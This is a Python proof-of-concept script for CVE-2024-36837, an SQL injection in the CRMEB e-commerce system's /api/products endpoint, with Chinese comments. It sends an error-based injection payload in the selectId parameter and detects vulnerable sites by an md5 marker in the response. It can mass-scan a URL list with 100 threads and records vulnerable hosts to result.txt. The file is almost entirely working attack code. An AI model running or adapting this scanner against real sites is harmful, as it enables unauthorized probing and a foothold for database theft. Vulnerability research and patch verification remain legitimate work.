#CRMEB 电商系统 apiproducts SQL注入漏洞(CVE-2024-36837).py
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   ____   ____  ____ _ ____  _ _____  ___  
 / ___| / ___|/ ___/ |___ \/ |___ / ( _ ) 
 \___ \| |  _| |  _| | __) | | |_ \ / _ \ 
  ___) | |_| | |_| | |/ __/| |___) | (_) |
 |____/ \____|\____|_|_____|_|____/ \___/ 
                                          
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="CRMEB电商系统apiproducts SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/api/products?limit=20&priceOrder&salesOrder&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1436528)))),0x7e),3550)'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
        'Connection':'close',
        'Accept':'*/*',
        'Accept-Language':'en',
        'Accept-Encoding':'gzip',
    }
    
    try:
        res = requests.get(url=url,headers=headers,timeout=8,verify=False)
        # expression = '81a9eb3487199f3a2da3e3f6591ffd62'
        # match = re.findall(expression,res.text)
        
        if res.status_code == 200 and "81a9eb3487199f3a2da3e3f6591ffd62" in res.text:
            print(f"[+]该网站存在SQL注入漏洞，url为{target}\n")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在SQL注入漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

if __name__ == '__main__':
    main()
